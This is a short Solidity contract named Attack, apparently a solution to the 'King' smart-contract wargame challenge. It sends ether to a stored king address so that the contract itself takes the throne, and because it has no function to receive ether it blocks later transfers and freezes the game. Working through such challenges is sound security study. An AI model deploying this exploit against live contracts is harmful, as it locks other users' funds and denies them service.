// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    address public King;

    constructor(address king){
        King = king;
    }

    function attackKing() public payable {
        (bool pass,) = payable(King).call{value: msg.value}("");
        require(pass, "ERROR");
    }
    
}